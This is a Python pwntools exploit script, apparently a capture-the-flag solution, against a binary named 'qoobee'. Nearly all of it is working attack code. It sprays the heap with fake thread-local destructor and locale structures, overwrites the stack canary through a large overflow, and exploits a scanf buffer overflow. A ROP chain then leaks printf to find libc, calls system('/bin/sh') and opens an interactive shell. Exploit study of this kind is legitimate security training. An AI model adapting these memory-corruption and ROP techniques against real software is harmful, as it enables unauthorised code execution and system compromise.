from pwn import *
from zio import COLORED

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

def heap_overflow(f, size, data):
    assert '\n' not in data
    f.send('1\n')
    f.recvuntil('? ')
    f.send(str(size) + '\n')
    f.recvuntil(': ')
    f.send(data + '\n')

target = "./qoobee"

f = process(target, timeout = 9999)

leave_message = 0x400D79
# Guessed heap pointer - we spray and brute the heap address.
heap_ptr = 0x1938810
# To make spraying simpler, use the heap pointer as the value to
# oversend the stack canary with.
stack_canary = heap_ptr
pop_rdi_ret = 0x401503

stdin_ptr = 0x602100
printf_ptr = 0x602018

puts = 0x400B00

# \x07 is considered whitespace and will terminate scanf.
fake_ctype_table = 0x602106
whitespace_char = '\x07'

spray = ''
spray += p(1)

# Fake thread local destructor (struct dtor_list)
spray += p(leave_message) # fun ptr
spray += p(fake_ctype_table)
spray += p(0)
spray += p(heap_ptr - 0x38)
# Fake locale structure starts here. Because leave_message uses scanf,
# this needs to be valid, and also not consider too many characters as
# whitespace (since scanf terminates on whitespace).
spray += p(heap_ptr + 8)
spray += p(heap_ptr - 0x48 + 0x20)
spray += p(0)

packet_size = len(spray)

# Spray the non-mmap heap with our fake structures.
spray_len = 8192*16 - 0x18
heap_overflow(f, spray_len, spray * (spray_len / packet_size))

payload = '\x00' * 0x100000

# Offset to the page that TLS lives on.
payload += '\x00' * 4080
# 0x1740 is (approximately) the page offset of the TLS (FS base).
payload += p(heap_ptr + 0x28) * (0x1740 / 8)
payload += p(heap_ptr) * 0x400

# Since this oversend modifies the stack canary, the function will call
# stack_chk_fail, which eventually exits and triggers our thread local
# destructors.
heap_overflow(f, 0x100000, payload)

# Now we should be calling leave_message, which contains a trivial scanf
# buffer overflow (and we know the canary, since we overwrote it).
f.recvuntil(': ')

read_until_newline = 0x400E94
pop_rbp_ret = 0x40149a
leave_ret = 0x400ddf
writable = 0x603000 - 64

payload = 'A' * 248
payload += p(stack_canary)
payload += 'A' * 8
payload += p(pop_rdi_ret)
payload += p(printf_ptr)
payload += p(puts)
payload += p(pop_rdi_ret)
payload += p(writable)
payload += p(read_until_newline)
payload += p(pop_rbp_ret)
payload += p(writable)
payload += p(leave_ret)

f.send(payload + whitespace_char)

#stdin = u(f.read(6).rstrip('\n').ljust(8, '\0'))
printf_addr = u(f.read(6).rstrip('\n').ljust(8, '\0'))

#libc_base = stdin - 0x3bf640
libc_base = printf_addr - 0x544F0

print 'libc_base =', hex(libc_base)
system = libc_base + 0x46640
system = libc_base + 0x44C40

binsh = libc_base + 0x17ccdb
binsh = libc_base + 0x17C09B

rop = 'X' * 7 # the whitespace char from above counts
rop += p(pop_rdi_ret)
rop += p(binsh)
rop += p(system)
f.send(rop + '\n')

f.interactive()